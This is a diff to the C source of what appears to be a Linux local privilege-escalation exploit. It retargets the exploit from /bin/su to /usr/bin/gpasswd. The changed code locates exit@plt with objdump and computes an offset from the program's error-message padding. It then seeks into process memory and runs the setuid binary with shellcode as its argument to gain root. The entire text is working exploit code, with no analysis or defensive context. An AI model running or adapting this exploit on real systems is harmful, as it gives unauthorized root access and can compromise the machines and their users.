@@ -134,29 +134,29 @@ int main(int argc, char **argv)
 		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
 			address = strtoul(argv[2], NULL, 16);
 		else {
-			printf("[+] Reading su for exit@plt.\n");
+			printf("[+] Reading gpasswd for exit@plt.\n");
 			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
-			FILE *command = popen("objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
+			FILE *command = popen("objdump -d /usr/bin/gpasswd|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
 			char result[32];
 			result[0] = 0;
 			fgets(result, 32, command);
 			pclose(command);
 			address = strtoul(result, NULL, 16);
 			if (address == ULONG_MAX || !address) {
-				printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
+				printf("[-] Could not resolve /usr/bin/gpasswd. Specify the exit@plt function address manually.\n");
 				printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
 				return 1;
 			}
 			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
 		}
-		printf("[+] Calculating su padding.\n");
-		FILE *command = popen("/bin/su this-user-does-not-exist 2>&1", "r");
+		printf("[+] Calculating gpasswd padding.\n");
+		FILE *command = popen("/usr/bin/gpasswd this-user-does-not-exist 2>&1", "r");
 		char result[256];
 		result[0] = 0;
 		fgets(result, 256, command);
 		pclose(command);
-		unsigned long su_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
-		unsigned long offset = address - su_padding;
+		unsigned long gpasswd_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
+		unsigned long offset = address - gpasswd_padding;
 		printf("[+] Seeking to offset 0x%lx.\n", offset);
 		lseek64(fd, offset, SEEK_SET);
 		
@@ -180,8 +180,8 @@ int main(int argc, char **argv)
 #else
 #error "That platform is not supported."
 #endif
-		printf("[+] Executing su with shellcode.\n");
-		execl("/bin/su", "su", shellcode, NULL);
+		printf("[+] Executing gpasswd with shellcode.\n");
+		execl("/usr/bin/gpasswd", "gpasswd", shellcode, NULL);
 	} else {
 		char sock[32];
 		sprintf(sock, "%d", sockets[0]);
